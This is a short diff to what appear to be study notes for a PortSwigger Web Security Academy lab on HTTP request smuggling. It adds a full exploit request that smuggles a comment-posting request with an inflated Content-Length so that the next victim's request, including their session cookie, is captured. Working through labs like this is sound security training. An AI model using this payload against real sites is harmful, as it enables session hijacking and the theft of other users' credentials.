@@ -97,6 +97,25 @@ Content Length around 750-850
 
 Change session cookie to solve the lab
 
+Final Exploit Request (Replace Host, postId and csrf token)
+
+```
+POST / HTTP/1.1
+Host: 0a90002b04b15de9c014b8db005f0019.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 360
+
+0
+
+POST /post/comment HTTP/1.1
+Host: 0a90002b04b15de9c014b8db005f0019.web-security-academy.net
+Cookie: session=sbnnlD0OFABLCgzRKGZXFmzcJwVLEGtz
+Content-Length: 850
+Content-Type: application/x-www-form-urlencoded
+
+csrf=rqW0Cl9z4rQei04LP8cR6t9BbyodLpFB&postId=8&name=aaa&email=email%40email.com&website=http%3A%2F%2Fa&comment=aaaaaaaaaaaaaaaaaaaaaaaaaaaa
+```
+
 https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te
 ![](https://i.imgur.com/8ddC7L6.png)
 
